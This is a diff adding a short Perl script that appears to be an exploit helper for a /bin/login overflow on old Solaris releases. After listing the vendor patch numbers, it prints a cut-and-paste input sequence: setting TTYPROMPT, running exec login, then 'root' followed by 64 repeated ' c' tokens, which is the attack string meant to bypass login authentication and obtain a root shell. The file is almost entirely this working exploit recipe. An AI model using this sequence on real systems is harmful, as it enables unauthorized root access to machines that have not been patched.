@@ -1,0 +1,18 @@
+#!/usr/bin/perl
+
+print "\n\nThis bug is based on an overflow in /bin/login.\n";
+print "The patches for it are :\n";
+print "2.6\t\t105665-04\n";
+print "2.7\t\t112300-01\n";
+print "2.8\t\t111085-01\n";
+print "\n\n";
+print "At the prompt, cut and paste the following\n\n";
+print "TTYPROMPT=aaaaa; export TTYPROMPT; exec login";
+
+print "\n";
+
+print "root";
+print  " c" x 64;
+print "\\n";
+print "\n\n";
+
